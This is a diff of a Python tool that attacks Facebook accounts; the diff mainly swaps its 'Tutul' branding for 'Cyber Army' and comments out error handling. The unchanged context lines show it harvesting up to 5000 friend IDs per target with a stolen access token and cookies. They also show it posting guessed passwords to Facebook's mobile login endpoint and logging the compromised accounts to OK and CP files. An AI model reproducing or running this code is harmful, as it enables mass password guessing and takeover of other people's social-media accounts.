@@ -13,7 +13,7 @@ os.system('clear')
 print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY SCRIPT GIFT GROUP")
 time.sleep(2)
 os.system(f'xdg-open https://facebook.com/groups/554714119911648/')
-# ------------------[ Tutul-King ]-------------------#
+# ------------------[ Cyber Army ]-------------------#
 # ------------------[ USER-AGENT ]-------------------#
 ua = [
     "Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36", ]
@@ -274,7 +274,6 @@ class jalan:
 
 def menu():
     os.system('clear')
-    # print(logo)
     print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m " + uname)
     print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;92m " + date)
     print('\033[0;97m===============================================')
@@ -310,7 +309,6 @@ def menu():
 
 def result():
     os.system('clear')
-    # print(logo)
     print(' \033[97;1m[\033[92;1m1\033[97;1m] CHECK CP IDZ ')
     print(' \033[97;1m[\033[92;1m2\033[97;1m] CHECK OK IDZ ')
     print(' \033[97;1m[\033[92;1m3\033[97;1m] EXIT ')
@@ -461,7 +459,7 @@ def dump_massal():
         kl = input(' \033[97;1m[\033[92;1m•\033[97;1m] INPUT UID ' + str(yz) + ' : ')
         uid.append(kl)
     for userr in uid:
-        try:
+       # try:
             col = ses.get(
                 'https://graph.facebook.com/v2.0/' + userr + '?fields=friends.limit(5000)&access_token=' + tokenku[0],
                 cookies={'cookies': cok}).json()
@@ -474,9 +472,9 @@ def dump_massal():
                         id.append(iso)
                 except:
                     continue
-        except (KeyError, IOError):
-            pass
-        except requests.exceptions.ConnectionError:
+       # except (KeyError, IOError):
+       #     pass
+       # except requests.exceptions.ConnectionError:
             print('\033[0;91m==================')
             animation(' [×] TRY AGAIN ')
             os.system('clear')
@@ -683,7 +681,7 @@ def crack(idf, pwv):
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa,
                           cookies={'cookie': koki}, headers=heade, allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[0;94m[Tutul-Cp] {idf} • {pw}')
+                print(f'\r\033[0;94m[Cyber-Cp] {idf} • {pw}')
                 os.system('espeak -a 300 " Cp,"')
                 open('CP/' + cpc, 'a').write(idf + ' • ' + pw + '\n')
                 akun.append(idf + ' • ' + pw)
@@ -744,7 +742,7 @@ def crackfree(idf, pwv):
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa,
                           cookies={'cookie': koki}, headers=heade, allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Tutul-Cp] {idf} • {pw}')
+                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Cyber-Cp] {idf} • {pw}')
                 os.system('espeak -a 300 " Cp,"')
                 open('CP/' + cpc, 'a').write(idf + ' • ' + pw + '\n')
                 akun.append(idf + ' • ' + pw)
@@ -754,8 +752,8 @@ def crackfree(idf, pwv):
                 ok += 1
                 coki = po.cookies.get_dict()
                 kuki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
-                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Tutul-Ok] {idf} • {pw} ')
-                os.system('espeak -a 300 " Ok,  Tutul,  id"')
+                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Cyber-Ok] {idf} • {pw} ')
+                os.system('espeak -a 300 " Ok,  Cyber,  id"')
                 open('OK/' + okc, 'a').write(idf + ' • ' + pw + '\n')
                 break
 
